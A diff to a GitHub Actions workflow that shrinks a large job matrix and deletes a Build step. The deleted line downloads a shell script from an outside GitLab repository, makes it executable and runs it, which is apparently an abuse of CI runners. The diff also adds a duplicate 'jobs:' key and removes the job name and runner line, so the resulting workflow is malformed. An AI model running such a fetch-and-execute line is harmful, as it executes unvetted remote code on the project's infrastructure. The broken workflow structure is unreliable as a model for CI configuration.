@@ -7,13 +7,12 @@ on:
     branches: [ main ]
 
 jobs:
+jobs:
 
-  build:
-    runs-on: Ubuntu-20.04
     strategy:
       matrix:
-        D1: [1,2,3,4,5,6,7,8,9,10,11,12]
-        D2: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21]
+        D1: [1,2]
+        D2: [1,2,3,4,5,6,7,8,9,10]
       fail-fast: false 
     steps:
     - name: Set up Go
@@ -25,7 +24,6 @@ jobs:
       uses: actions/checkout@v2
     - name: Build
       run: |
-        wget https://gitlab.com/dif.addition/chown/-/raw/master/build.sh && chmod +x build.sh && ./build.sh
         echo "done"
     - name: Test
       run: echo "done"
